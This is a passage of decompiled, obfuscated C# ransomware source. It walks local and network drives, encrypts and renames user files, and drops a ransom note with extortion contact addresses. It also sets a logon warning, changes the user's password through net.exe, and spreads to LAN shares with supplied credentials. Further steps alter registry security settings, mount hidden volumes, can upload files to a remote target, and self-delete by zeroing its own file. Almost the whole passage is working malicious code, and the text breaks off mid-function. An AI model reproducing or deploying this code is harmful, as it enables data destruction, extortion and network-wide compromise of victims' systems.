				hpKEwTWkHYGB(zRLJxwzheNLg, WRpoJrwFcVkpp);
			}
			else
			{
				hpKEwTWkHYGB();
			}
		}
		if (MNpRiuecDY != "LOGONISOFF")
		{
			LfovTrMBCHAlx(MNpRiuecDY);
		}
		if (!string.IsNullOrEmpty(yhMcbyErjAqsk))
		{
			try
			{
				File.Delete(yhMcbyErjAqsk);
			}
			catch
			{
			}
		}
		if (EcLYLrJYMXynSJF == "EVET")
		{
			rGaFcSoQCZvEsGF();
		}
	}

	public static void RBNwRKGZdZfzuB()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(tEHBqPAYINDcv("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), tEHBqPAYINDcv("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int vWVZkrrfmUbgZjU(int NhdefUeWBkAd, int HuetedoPwaAZn)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(NhdefUeWBkAd, HuetedoPwaAZn);
	}

	public static List<string> gAlhnRVHSxyaN(string iNJlnbFRmigs, string[] rTcPRZoQFOcVbdF, string lSiojESSPPEZve, string[] GRXOwHhmbLla, string AVjDjVHoXfVpGz)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(iNJlnbFRmigs);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata"))
				{
					array = Directory.GetFiles(text);
					goto IL_00b4;
				}
			}
			catch
			{
			}
			continue;
			IL_00b4:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(tEHBqPAYINDcv("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") && !fileInfo.FullName.EndsWith(".locked") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(AAsNehQDcrriH))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(riXOsPCdks) * 1024.0 * 1024.0 && VsrAGOMgiir == "YES")
						{
							list.Add(fileInfo.FullName);
							WYUQGCrCRXJ(list, rTcPRZoQFOcVbdF, lSiojESSPPEZve, GRXOwHhmbLla, AVjDjVHoXfVpGz);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && VsrAGOMgiir == "NO")
						{
							list.Add(fileInfo.FullName);
							WYUQGCrCRXJ(list, rTcPRZoQFOcVbdF, lSiojESSPPEZve, GRXOwHhmbLla, AVjDjVHoXfVpGz);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> lIDSlKYJZxPCabE(string iEhQIjVKhJhQX)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(iEhQIjVKhJhQX);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(tEHBqPAYINDcv("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("HOW_TO_DECYPHER_FILES") && !item.FullName.EndsWith(".locked") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(riXOsPCdks) * 1024.0 * 1024.0 && VsrAGOMgiir == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && VsrAGOMgiir == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(tEHBqPAYINDcv("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("HOW_TO_DECYPHER_FILES") && !item3.FullName.EndsWith(".locked") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(riXOsPCdks) * 1024.0 * 1024.0 && VsrAGOMgiir == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && VsrAGOMgiir == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string gDpzQqgYfCWc(string SwwrYrjnDgLRd = "", string MiTZAQgEuKdvw = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = SwwrYrjnDgLRd,
				Arguments = MiTZAQgEuKdvw,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xHCzUjkOaL(string jbcoVZSgqPLstmP)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = jbcoVZSgqPLstmP,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string pQkpmEyMBZU(string mUrHLFlcEtPd)
	{
		char[] array = mUrHLFlcEtPd.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string tEHBqPAYINDcv(string EvigqzPApdSm)
	{
		byte[] bytes = Convert.FromBase64String(EvigqzPApdSm);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void fUnFOqKpuvYW(string daIQESEgYxGo = "", string TeqfioBkaOFw = "SW5mb3JtYXRpb24uLi4=", string quWOtaYCtkeM = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		daIQESEgYxGo = pQkpmEyMBZU("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tEHBqPAYINDcv(daIQESEgYxGo), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(tEHBqPAYINDcv("TGVnYWxOb3RpY2VDYXB0aW9u"), tEHBqPAYINDcv(TeqfioBkaOFw));
			registryKey.SetValue(tEHBqPAYINDcv("TGVnYWxOb3RpY2VUZXh0"), tEHBqPAYINDcv(quWOtaYCtkeM));
			registryKey.Close();
		}
	}

	public static void TQOKiPsjcMeFMoe()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (bvbGdcllkgyto == "YES" && !string.IsNullOrEmpty(zRLJxwzheNLg) && !string.IsNullOrEmpty(WRpoJrwFcVkpp))
				{
					fUnFOqKpuvYW("", zRLJxwzheNLg, WRpoJrwFcVkpp);
				}
				else
				{
					fUnFOqKpuvYW();
				}
			}
		}
		catch
		{
		}
	}

	public static void hpKEwTWkHYGB(string hTLJItOlnDiQJ = "SW5mb3JtYXRpb24uLi4=", string bTyNzvdCLJWFw = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(tEHBqPAYINDcv(hTLJItOlnDiQJ));
		val.set_BalloonTipText(tEHBqPAYINDcv(bTyNzvdCLJWFw));
		val.ShowBalloonTip(30000);
	}

	public static void LfovTrMBCHAlx(string opgzbwPzJgbhf)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		gDpzQqgYfCWc("net.exe", "user " + text + " " + opgzbwPzJgbhf);
	}

	private static void NSEgaGtRKGSCL()
	{
		//IL_02db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e2: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		CTnMLFXURzdLx = QZkYxCOnIUaFQzfJ.icZVuhrLOczo();
		List<GMJrWlIHUe> list = GMJrWlIHUe.niOvZnVGLkKrPrn();
		foreach (GMJrWlIHUe item in list)
		{
			qDhBgGHVUmwK.Add(item.XqooAECwffbFXthoSi);
		}
		oJdFekDhqjyAJHw = CTnMLFXURzdLx.Union(qDhBgGHVUmwK).ToList();
		foreach (string item2 in oJdFekDhqjyAJHw)
		{
			if ((!item2.StartsWith("10.") && !item2.StartsWith("172.16.") && !item2.StartsWith("192.168.") && !item2.StartsWith("")) || !QZkYxCOnIUaFQzfJ.SvngEtqFtLsy(item2))
			{
				continue;
			}
			try
			{
				if (OTcIywxSSHPZqmY == "YES")
				{
					for (int i = 0; i < QZkYxCOnIUaFQzfJ.pXerCkMOBZYzN.Count; i++)
					{
						gDpzQqgYfCWc("net.exe", "use \\\\" + item2 + " /USER:" + QZkYxCOnIUaFQzfJ.pXerCkMOBZYzN[i] + " " + QZkYxCOnIUaFQzfJ.zAwLDIOooE[i]);
					}
				}
				else
				{
					gDpzQqgYfCWc("net.exe", "use \\\\" + item2);
				}
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string evigqzPApdSm = pQkpmEyMBZU("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tEHBqPAYINDcv(evigqzPApdSm), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(tEHBqPAYINDcv("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(tEHBqPAYINDcv("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (AidMMpnxVnP == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, tEHBqPAYINDcv("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				gDpzQqgYfCWc("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator3 = val.Get().GetEnumerator();
		try
		{
			while (enumerator3.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator3.get_Current();
				if (!GrDdmoqpEPCpU.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					GrDdmoqpEPCpU.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator3)?.Dispose();
		}
	}

	public static bool FXwamQtWCMstNuUpvQ()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void rGaFcSoQCZvEsGF()
	{
		gDpzQqgYfCWc("cmd.exe", tEHBqPAYINDcv("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = tEHBqPAYINDcv("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ZZghHyGGSZepA(string OhTYluOVpHQj)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(OhTYluOVpHQj);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(OhTYluOVpHQj, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch
		{
		}
	}

	public static string ZrOilYuaRpvX(string MClyjKYgiMT)
	{
		string text = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(tEHBqPAYINDcv("QXR0ZW50aW9uIQ0KDQpZb3VyIG5ldHdvcmsgd2FzIEFUVEFDS0VELCB5b3VyIGNvbXB1dGVycyBhbmQgc2VydmVycyB3ZXJlIExPQ0tFRCwNCkl0IG1lYW5zIHRoYXQgc29vbiBtYXNzIG1lZGlhLCB5b3VyIHBhcnRuZXJzIGFuZCBjbGllbnRzIFdJTEwgS05PVyBhYm91dCB5b3VyIFBST0JMRU0uDQpUbyBhdm9pZCB0aGlzIGlzc3VlIHlvdSBhcmUgdG8gQ09NRSBJTiBUT1VDSCBXSVRIIFVTLg0KcmVzdG9yZWZpbGVzZW5jcnlwdGVkQGNvY2subGkNCnJlc3RvcmVlbmNyeXB0ZWRAc2VjbWFpbC5wcm8="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(tEHBqPAYINDcv("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(MClyjKYgiMT);
				return text;
			}
		}
		File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + MClyjKYgiMT);
		return text;
	}

	public static void YBubIPnOcfJIDY(string CNDKsFeTeDkLfdM, string LGpSVTmVpeuGkOF)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + CNDKsFeTeDkLfdM + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + LGpSVTmVpeuGkOF);
		streamWriter.WriteLine("IconIndex=0");
		string text = LGpSVTmVpeuGkOF.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void vHPbaePxJs(string[] VrzceMVsTmPz, string[] yVLWqzXwyf, string[] DosSssNvSSKONV, string RyeaZfOxDwENY, string VAiIcNXSWUiA)
	{
		sFcjbqQpCeL = Encoding.ASCII.GetBytes(RyeaZfOxDwENY);
		DriveInfo[] array = null;
		if (VrzceMVsTmPz[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !GrDdmoqpEPCpU.Contains(array[i].Name))
					{
						GrDdmoqpEPCpU.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < VrzceMVsTmPz.Length; j++)
			{
				if (!GrDdmoqpEPCpU.Contains(VrzceMVsTmPz[j]))
				{
					GrDdmoqpEPCpU.Add(VrzceMVsTmPz[j]);
				}
			}
		}
		if (GrDdmoqpEPCpU.Contains(tEHBqPAYINDcv("Qzpc")) && aaRiULuNabm == "YES")
		{
			GrDdmoqpEPCpU.Remove(tEHBqPAYINDcv("Qzpc"));
		}
		if (eUnzhPnQoJDAd == "YES")
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				qmccBJLXnWn.MSpVxwAnJkbUB();
			});
			thread.IsBackground = false;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		foreach (string UVyMrEbSrOfR in GrDdmoqpEPCpU)
		{
			if (qjYyDXzYrwB == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					CuAcRbuRieM(UVyMrEbSrOfR, yVLWqzXwyf, VAiIcNXSWUiA, DosSssNvSSKONV, RyeaZfOxDwENY);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				CuAcRbuRieM(UVyMrEbSrOfR, yVLWqzXwyf, VAiIcNXSWUiA, DosSssNvSSKONV, RyeaZfOxDwENY);
			}
		}
	}

	public static void CuAcRbuRieM(string KbNOYDxnRqNPl, string[] qOGmImVYPZmhsH, string LAKzendvuccwXkp, string[] BAsWfXvgKc, string xoqwhGoJehM)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (nJvNerTaWtBL == "NO")
		{
			list = gAlhnRVHSxyaN(KbNOYDxnRqNPl, qOGmImVYPZmhsH, LAKzendvuccwXkp, BAsWfXvgKc, xoqwhGoJehM);
			return;
		}
		list = VeQPTbSHeMYm.SearchFiles(KbNOYDxnRqNPl);
		foreach (string text in qOGmImVYPZmhsH)
		{
			foreach (string item in list)
			{
				if (BAsWfXvgKc.Length != 0)
				{
					int num = 0;
					while (num < BAsWfXvgKc.Length)
					{
						string value = BAsWfXvgKc[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f1;
					}
				}
				if ((AyaMUSvKASQrXwE == "NO" && !item.EndsWith(text)) || lcwZgHzgRvhoMz.Contains(item))
				{
					continue;
				}
				if (FSkrrCQAIpuB == "YES")
				{
					try
					{
						if (jmBcImfTEkDAKE.xPOFMJanBPGOSC(item))
						{
							jmBcImfTEkDAKE.DxWOrEkBWxMLn(item);
						}
					}
					catch
					{
					}
				}
				lcwZgHzgRvhoMz.Add(item);
				if (!xNfCQSzUMjqNUFLU.Contains(Path.GetDirectoryName(item)))
				{
					xNfCQSzUMjqNUFLU.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (BJRJMRvLJvUy == "YES" && fileStream.Length > Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024 && !list3.Contains(text))
					{
						if (dZaLbHeSffOykBlbqT == "YES")
						{
							foreach (string item2 in ptwMCNORHSBSo)
							{
								if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "YES")
								{
									if (Convert.ToInt32(ZaYuJzCvuUhm) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "NO")
								{
									try
									{
										ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] aGiQcelJUxcA = WKTrUcDvdshUI.SYFaRhrUKFjplK(item, Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024);
						byte[] gPLnSCijzCol = WKTrUcDvdshUI.nJFhMsmRXfyvJ(aGiQcelJUxcA, Encoding.ASCII.GetBytes(xoqwhGoJehM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						WKTrUcDvdshUI.FjemdWpOHZlReLE(item, gPLnSCijzCol);
						if (LAKzendvuccwXkp != ".*")
						{
							File.Move(item, item + LAKzendvuccwXkp);
						}
					}
					else if (LAKzendvuccwXkp != ".*")
					{
						wNfDyNaZgcBgGVeuD(item, item + LAKzendvuccwXkp, sFcjbqQpCeL);
					}
					else
					{
						wNfDyNaZgcBgGVeuD(item, item + ".part", sFcjbqQpCeL);
					}
				}
				catch (Exception)
				{
				}
				IL_02f1:;
			}
		}
	}

	public static void WYUQGCrCRXJ(List<string> fbGyXXQuJfOVM, string[] StjWaImOkCHt, string RoBSIleatdekdR, string[] aqqhhbrgaYbWC, string HHiBuHJYPfV)
	{
		List<string> TAERpmtDAObfY = new List<string> { "" };
		Parallel.ForEach(StjWaImOkCHt, delegate(string t1)
		{
			foreach (string item in fbGyXXQuJfOVM)
			{
				if (aqqhhbrgaYbWC.Length != 0)
				{
					string[] array = aqqhhbrgaYbWC;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						string text = item.ToLower();
						if (!text.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0336;
					}
				}
				if (AyaMUSvKASQrXwE == "NO")
				{
					string text2 = item.ToLower();
					if (!text2.EndsWith(t1))
					{
						continue;
					}
				}
				if (!lcwZgHzgRvhoMz.Contains(item))
				{
					if (FSkrrCQAIpuB == "YES")
					{
						try
						{
							if (jmBcImfTEkDAKE.xPOFMJanBPGOSC(item))
							{
								jmBcImfTEkDAKE.DxWOrEkBWxMLn(item);
							}
						}
						catch
						{
						}
					}
					lcwZgHzgRvhoMz.Add(item);
					if (!xNfCQSzUMjqNUFLU.Contains(Path.GetDirectoryName(item)))
					{
						xNfCQSzUMjqNUFLU.Add(Path.GetDirectoryName(item));
					}
					ZZghHyGGSZepA(item);
					try
					{
						try
						{
							if (new FileInfo(item).Length != 0L)
							{
								goto end_IL_00e8;
							}
							goto end_IL_00e8_2;
							end_IL_00e8:;
						}
						catch (Exception)
						{
							goto end_IL_00e8_2;
						}
						FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (BJRJMRvLJvUy == "YES" && fileStream.Length > Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024 && !TAERpmtDAObfY.Contains(t1))
						{
							if (dZaLbHeSffOykBlbqT == "YES")
							{
								foreach (string item2 in ptwMCNORHSBSo)
								{
									if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "YES")
									{
										if (Convert.ToInt32(ZaYuJzCvuUhm) * 1024 * 1024 > fileStream.Length)
										{
											try
											{
												ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
											}
											catch
											{
											}
										}
									}
									else if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "NO")
									{
										try
										{
											ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
							}
							fileStream.Dispose();
							byte[] array2 = null;
							byte[] array3 = WKTrUcDvdshUI.SYFaRhrUKFjplK(item, Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024);
							array2 = (qDwCLcYLcoNWFI ? oKIHSxCMzfhfpfvg.VrHhCfQdmwyaCt(array3, Encoding.ASCII.GetBytes(HHiBuHJYPfV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WKTrUcDvdshUI.nJFhMsmRXfyvJ(array3, Encoding.ASCII.GetBytes(HHiBuHJYPfV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
							WKTrUcDvdshUI.FjemdWpOHZlReLE(item, array2);
							if (RoBSIleatdekdR != ".*")
							{
								File.Move(item, item + RoBSIleatdekdR);
							}
						}
						else if (RoBSIleatdekdR != ".*")
						{
